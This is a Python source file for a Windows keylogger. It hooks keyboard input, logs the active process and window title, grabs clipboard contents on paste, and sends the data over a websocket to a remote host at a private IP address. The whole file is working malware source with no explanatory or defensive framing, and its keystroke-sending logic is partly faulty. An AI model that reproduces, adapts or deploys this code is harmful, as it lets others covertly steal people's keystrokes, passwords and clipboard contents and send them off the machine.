from ctypes import *
import pythoncom
import pyWinhook as pyhook
import pywintypes as pywin32
import websockets
import asyncio

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

url = "ws://192.168.1.7:8765"

logged = []

def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read it's title
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    print()

    keylogger_data = f"ID:{process_id} exe:{executable.value} title:{window_title.value}"



    print("[ PID: %s - %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value, 
                                     length
                                     )
          )
    print()

    # close handles

    print(keylogger_data)

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    return keylogger_data


def KeyStroke(event):
    global current_window

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        data = get_current_process()

        asyncio.get_event_loop().run_until_complete(client(data))

    # if they pressed a standard key
    if 33 < event.Ascii < 127:
        logged.append(chr(event.Ascii))
        if event.Ascii == 32 or event.Ascii == 10:
            asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            pywin32.win32clipboard.OpenClipboard()
            pasted_value = pywin32.win32clipboard.GetClipboardData()
            pywin32.win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % pasted_value, end=' ')
        else:
            print("[%s]" % event.Key, end=' ')

    # pass execution to next hook registered 
    return True


async def client(data):
    async with websockets.connect(url) as websocket:
        await websocket.send(data)


# create and register a hook manager
kl = pyhook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()